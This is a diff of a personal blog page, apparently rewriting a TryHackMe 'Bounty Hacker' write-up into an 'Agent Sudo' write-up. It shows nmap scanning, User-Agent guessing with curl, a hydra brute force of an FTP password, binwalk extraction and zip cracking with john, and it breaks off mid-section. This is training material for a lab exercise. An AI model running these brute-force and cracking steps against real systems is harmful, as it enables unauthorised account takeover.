@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Bounty Hacker &middot; Nurimy&#39;s blog</title>
-  <meta name="title" content="Bounty Hacker &middot; Nurimy&#39;s blog" />
+  <title>Agent Sudo &middot; Nurimy&#39;s blog</title>
+  <meta name="title" content="Agent Sudo &middot; Nurimy&#39;s blog" />
   
-  <meta name="description" content="Basic Pentesting writeup (Easy)." />
+  <meta name="description" content="Agent Sudo writeup (Easy)." />
   
   
   
-  <link rel="canonical" href="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/" />
+  <link rel="canonical" href="//localhost:1313/writeups/tryhackme/easy/agent-sudo/" />
   
   
   
@@ -65,22 +65,22 @@
   
   
   
-  <meta property="og:url" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/">
+  <meta property="og:url" content="//localhost:1313/writeups/tryhackme/easy/agent-sudo/">
   <meta property="og:site_name" content="Nurimy&#39;s blog">
-  <meta property="og:title" content="Bounty Hacker">
-  <meta property="og:description" content="Basic Pentesting writeup (Easy).">
+  <meta property="og:title" content="Agent Sudo">
+  <meta property="og:description" content="Agent Sudo writeup (Easy).">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2024-06-15T00:00:00+00:00">
-    <meta property="article:modified_time" content="2024-06-15T00:00:00+00:00">
-    <meta property="og:image" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/featured.png">
+    <meta property="article:published_time" content="2024-06-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-06-17T00:00:00+00:00">
+    <meta property="og:image" content="//localhost:1313/writeups/tryhackme/easy/agent-sudo/featured.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/featured.png">
-  <meta name="twitter:title" content="Bounty Hacker">
-  <meta name="twitter:description" content="Basic Pentesting writeup (Easy).">
+  <meta name="twitter:image" content="//localhost:1313/writeups/tryhackme/easy/agent-sudo/featured.png">
+  <meta name="twitter:title" content="Agent Sudo">
+  <meta name="twitter:description" content="Agent Sudo writeup (Easy).">
 
   
   <script type="application/ld+json">
@@ -88,26 +88,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Writeups",
-    "name": "Bounty Hacker",
-    "headline": "Bounty Hacker",
-    "description": "Basic Pentesting writeup (Easy).",
-    "abstract": "Enumeration Firstly, we\u0026rsquo;re doing a ping to see if the machine is running.",
+    "name": "Agent Sudo",
+    "headline": "Agent Sudo",
+    "description": "Agent Sudo writeup (Easy).",
+    "abstract": "Enumeration Firstly, we do a ping to see if the machine is active.",
     "inLanguage": "en",
-    "url" : "\/\/localhost:1313\/writeups\/tryhackme\/easy\/bounty-hacker\/",
+    "url" : "\/\/localhost:1313\/writeups\/tryhackme\/easy\/agent-sudo\/",
     "author" : {
       "@type": "Person",
       "name": "Nurimy"
     },
     "copyrightYear": "2024",
-    "dateCreated": "2024-06-15T00:00:00\u002b00:00",
-    "datePublished": "2024-06-15T00:00:00\u002b00:00",
+    "dateCreated": "2024-06-17T00:00:00\u002b00:00",
+    "datePublished": "2024-06-17T00:00:00\u002b00:00",
     
-    "dateModified": "2024-06-15T00:00:00\u002b00:00",
+    "dateModified": "2024-06-17T00:00:00\u002b00:00",
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "359"
+    "wordCount": "614"
   }]
   </script>
 
@@ -490,7 +490,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Bounty Hacker
+      Agent Sudo
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -578,7 +578,13 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#ftp-anonymous-login--bruteforce">FTP Anonymous login &amp; Bruteforce</a></li>
+    <li><a href="#apache--ftp-brute-force">Apache &amp; FTP Brute force</a></li>
+    <li><a href="#steganography">Steganography</a>
+      <ul>
+        <li><a href="#binwalk">Binwalk</a></li>
+        <li><a href="#steghide">Steghide</a></li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege escalation</a></li>
   </ul>
 </nav>
@@ -594,7 +600,13 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#ftp-anonymous-login--bruteforce">FTP Anonymous login &amp; Bruteforce</a></li>
+    <li><a href="#apache--ftp-brute-force">Apache &amp; FTP Brute force</a></li>
+    <li><a href="#steganography">Steganography</a>
+      <ul>
+        <li><a href="#binwalk">Binwalk</a></li>
+        <li><a href="#steghide">Steghide</a></li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege escalation</a></li>
   </ul>
 </nav>
@@ -620,213 +632,217 @@
     
 </h2>
 <hr>
-<p>Firstly, we&rsquo;re doing a ping to see if the machine is running..</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
+<p>Firstly, we do a ping to see if the machine is active.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span>
 </span></span></code></pre></div><p>
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_660x0_resize_box_3.png"
-        alt="Image 1"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/1.png" alt="Image 1" />
       
     </figure>
-</p>
-<p>Now that we know the machine is active it&rsquo;s time to scan it with nmap.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Scan</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
-</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mo">054</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">55529</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">),</span> <span class="mi">10003</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+
+Now that we know the machine is running it&rsquo;s time to scan it and see which services are active.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Scan</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span>
+</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">098</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
 </span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">vsftpd</span> <span class="mi">3</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="ss">syst</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">STAT</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="no">FTP</span> <span class="n">server</span> <span class="ss">status</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Connected</span> <span class="n">to</span> <span class="o">::</span><span class="ss">ffff</span><span class="p">:</span><span class="mi">10</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">203</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Logged</span> <span class="k">in</span> <span class="n">as</span> <span class="n">ftp</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="ss">TYPE</span><span class="p">:</span> <span class="no">ASCII</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">No</span> <span class="n">session</span> <span class="n">bandwidth</span> <span class="n">limit</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Session</span> <span class="n">timeout</span> <span class="k">in</span> <span class="n">seconds</span> <span class="n">is</span> <span class="mi">300</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Control</span> <span class="n">connection</span> <span class="n">is</span> <span class="n">plain</span> <span class="n">text</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Data</span> <span class="n">connections</span> <span class="n">will</span> <span class="n">be</span> <span class="n">plain</span> <span class="n">text</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">At</span> <span class="n">session</span> <span class="n">startup</span><span class="p">,</span> <span class="n">client</span> <span class="n">count</span> <span class="n">was</span> <span class="mi">2</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="n">vsFTPd</span> <span class="mi">3</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span> <span class="o">-</span> <span class="n">secure</span><span class="p">,</span> <span class="n">fast</span><span class="p">,</span> <span class="n">stable</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_End</span> <span class="n">of</span> <span class="n">status</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="ss">anon</span><span class="p">:</span> <span class="no">Anonymous</span> <span class="no">FTP</span> <span class="n">login</span> <span class="n">allowed</span> <span class="p">(</span><span class="no">FTP</span> <span class="n">code</span> <span class="mi">230</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_Can</span><span class="s1">&#39;t get directory listing: TIMEOUT
-</span></span></span><span class="line"><span class="cl"><span class="s1">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-</span></span></span><span class="line"><span class="cl"><span class="s1">| ssh-hostkey: 
-</span></span></span><span class="line"><span class="cl"><span class="s1">|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
-</span></span></span><span class="line"><span class="cl"><span class="s1">|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
-</span></span></span><span class="line"><span class="cl"><span class="s1">|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
-</span></span></span><span class="line"><span class="cl"><span class="s1">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)
-</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span><span class="n">t</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mi">7</span><span class="o">.</span><span class="mi">6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">2048</span> <span class="ss">ef</span><span class="p">:</span><span class="mi">1</span><span class="ss">f</span><span class="p">:</span><span class="mi">5</span><span class="ss">d</span><span class="p">:</span><span class="mo">04</span><span class="ss">:d4</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="mi">72</span><span class="ss">:ec:f0</span><span class="p">:</span><span class="mi">58</span><span class="ss">:f2:cc</span><span class="p">:</span><span class="mo">07</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">5</span><span class="ss">e</span><span class="p">:</span><span class="mo">02</span><span class="ss">:d1</span><span class="p">:</span><span class="mi">9</span><span class="ss">a</span><span class="p">:</span><span class="ss">c4</span><span class="p">:</span><span class="ss">e7</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">62</span><span class="ss">:c1</span><span class="p">:</span><span class="mi">9</span><span class="ss">e</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">8</span><span class="ss">a</span><span class="p">:</span><span class="ss">e7</span><span class="p">:</span><span class="n">ea</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">2</span><span class="ss">d</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">5</span><span class="ss">c</span><span class="p">:</span><span class="ss">b9</span><span class="p">:</span><span class="ss">fd</span><span class="p">:</span><span class="ss">a8</span><span class="p">:</span><span class="ss">c8</span><span class="p">:</span><span class="ss">d8</span><span class="p">:</span><span class="mi">80</span><span class="ss">:e3</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">4</span><span class="ss">f</span><span class="p">:</span><span class="mi">8</span><span class="ss">b</span><span class="p">:</span><span class="mi">4</span><span class="ss">f</span><span class="p">:</span><span class="mi">18</span><span class="ss">:e2</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">29</span> <span class="p">((</span><span class="no">Ubuntu</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title</span><span class="p">:</span> <span class="no">Annoucement</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header</span><span class="p">:</span> <span class="no">Apache</span><span class="o">/</span><span class="mi">2</span><span class="o">.</span><span class="mi">4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">OSs</span><span class="p">:</span> <span class="no">Unix</span><span class="p">,</span> <span class="no">Linux</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kernel
-</span></span></span></code></pre></div>
+</span></span></span></code></pre></div><p>The scan shows that we&rsquo;ve got an ftp, ssh and http. Let&rsquo;s take a look at the apache.</p>
 
-<h2 class="relative group">FTP Anonymous login &amp; Bruteforce 
-    <div id="ftp-anonymous-login--bruteforce" class="anchor"></div>
+
+<h2 class="relative group">Apache &amp; FTP Brute force 
+    <div id="apache--ftp-brute-force" class="anchor"></div>
     
 </h2>
 <hr>
-<p>In the scan results, it looks like the machine has <strong>FTP Anonymous login</strong>. We can log in with <strong>anonymous</strong> with a blank password.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
-</span></span></code></pre></div><p>There are two files:</p>
 <p>
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_660x0_resize_box_3.png"
-        alt="Image 2"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/2.png" alt="Image 2" />
       
     </figure>
-</p>
-<p>In task.txt we have the user lin who made the note.</p>
-<p>
+
+The page shows a message that says we must provide a <strong>codename</strong> within the <strong>user-agent</strong> header so we can do it with curl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">curl</span> <span class="o">-</span><span class="n">A</span> <span class="s2">&#34;C&#34;</span> <span class="o">-</span><span class="n">L</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span>
+</span></span></code></pre></div><p>After a couple of tries, find out that is the <strong>letter C</strong>.
+
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_660x0_resize_box_3.png"
-        alt="Image 3"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/3.png" alt="Image 3" />
       
     </figure>
-</p>
-<p>And ind locks.txt, we have a password wordlist.</p>
-<p>
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_660x0_resize_box_3.png"
-        alt="Image 4"
-      />
-      
-    </figure>
-</p>
-<p>In order to do the <strong>bruteforce attack</strong>, we&rsquo;re using hydra.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">lin</span> <span class="o">-</span><span class="n">P</span> <span class="n">locks</span><span class="o">.</span><span class="n">txt</span> <span class="ss">ssh</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>  
+
+The response gave us the user <strong>chris</strong> and say that the <strong>password is weak</strong> so it must be crackable with hydra.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">chris</span> <span class="o">-</span><span class="n">P</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span> <span class="n">ftp</span>
 </span></span></code></pre></div><p>
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_660x0_resize_box_3.png"
-        alt="Image 5"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/4.png" alt="Image 4" />
+      
+    </figure>
+
+With that credentials we can log into the <strong>FTP Server</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/5.png" alt="Image 5" />
+      
+    </figure>
+
+The FTP server has <strong>2 jpg images</strong> and a note, but the interesting thing is in the images.</p>
+
+
+<h2 class="relative group">Steganography 
+    <div id="steganography" class="anchor"></div>
+    
+</h2>
+<hr>
+<blockquote>
+<p>Steganography is the practice of representing information within another message or physical object, in such a manner that the presence of the information is not evident to human inspection.</p>
+</blockquote>
+
+
+<h3 class="relative group">Binwalk 
+    <div id="binwalk" class="anchor"></div>
+    
+</h3>
+<blockquote>
+<p>Binwalk is a tool for search binary images for embedded files and executable code.</p>
+</blockquote>
+<p>If we inspect <strong>cutie.png</strong> with binwalk, we&rsquo;ll see that there are some files hidden in it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">binwalk</span> <span class="n">cutie</span><span class="o">.</span><span class="n">png</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/6.png" alt="Image 6" />
+      
+    </figure>
+
+To extract the files we use <strong>-e</strong> parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">binwalk</span> <span class="o">-</span><span class="n">e</span> <span class="n">cutie</span><span class="o">.</span><span class="n">png</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/7.png" alt="Image 7" />
+      
+    </figure>
+
+Binwalk generated a folder with 3 files inside.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/8.png" alt="Image 8" />
+      
+    </figure>
+
+The most interesting thing is <strong>8702.zip</strong>. But if we try to unzip it, we&rsquo;ll find that it <strong>needs a password</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">7</span><span class="n">z</span> <span class="n">x</span> <span class="mi">8702</span><span class="o">.</span><span class="n">zip</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/9.png" alt="Image 9" />
+      
+    </figure>
+
+In order to <strong>crack the zip</strong>, we need to transform it into a hash to be able to crack it with john.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">zip2john</span> <span class="mi">8702</span><span class="o">.</span><span class="n">zip</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+</span></span></code></pre></div><p>The hash should look like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">8702</span><span class="o">.</span><span class="n">zip</span><span class="o">/</span><span class="no">To_agentR</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="vg">$zip2$*</span><span class="mi">0</span><span class="o">*</span><span class="mi">1</span><span class="o">*</span><span class="mi">0</span><span class="o">*</span><span class="mi">4673</span><span class="n">cae714579045</span><span class="o">*</span><span class="mi">67</span><span class="n">aa</span><span class="o">*</span><span class="mi">4</span><span class="n">e</span><span class="o">*</span><span class="mi">61</span><span class="n">c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e</span><span class="o">*</span><span class="mi">4969</span><span class="n">f382486cb6767ae6</span><span class="o">*</span><span class="vg">$/</span><span class="n">zip2</span><span class="vg">$:</span><span class="no">To_agentR</span><span class="o">.</span><span class="n">txt</span><span class="p">:</span><span class="mi">8702</span><span class="o">.</span><span class="n">zip</span><span class="p">:</span><span class="mi">8702</span><span class="o">.</span><span class="n">zip</span>
+</span></span></code></pre></div><p>To crack it, we execute john with the hash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">john</span> <span class="nb">hash</span>                                         
+</span></span></code></pre></div><p>
+    <figure>
